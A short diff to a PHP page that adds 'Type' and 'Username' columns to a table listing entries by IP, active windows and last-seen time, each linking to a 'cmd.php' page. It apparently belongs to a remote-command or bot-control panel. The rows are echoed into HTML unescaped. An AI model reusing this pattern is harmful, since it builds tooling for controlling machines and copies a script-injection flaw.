@@ -20,7 +20,9 @@ if ($conn->connect_error)
     <thead>
       <tr>
         <th>id</th>
+		<th>Type</th>
         <th>Name</th>
+		<th>Username</th>
         <th>Active</th>
 		<th>IP</th>
 		<th>ActiveWindows</th>
@@ -32,7 +34,7 @@ if ($conn->connect_error)
     <tbody>';
 				// output data of each row
 				while($row = $result->fetch_assoc()) {
-					echo '<tr><td>'.$row["id"].'</td><td>'.$row["name"].'</td><td>'.$row["active"].'</td><td>'.$row["ip"].'</td><td>'.$row["activewindows"].'</td><td>'.$row["lastseen"].'</td><td><a href="cmd.php?id='.$row["id"].'">Select</a></td></tr>';
+					echo '<tr><td>'.$row["id"].'</td><td>'.$row["type"].'</td><td>'.$row["name"].'</td><td>'.$row["username"].'</td><td>'.$row["active"].'</td><td>'.$row["ip"].'</td><td>'.$row["activewindows"].'</td><td>'.$row["lastseen"].'</td><td><a href="cmd.php?id='.$row["id"].'">Select</a></td></tr>';
 				
 				
 				}
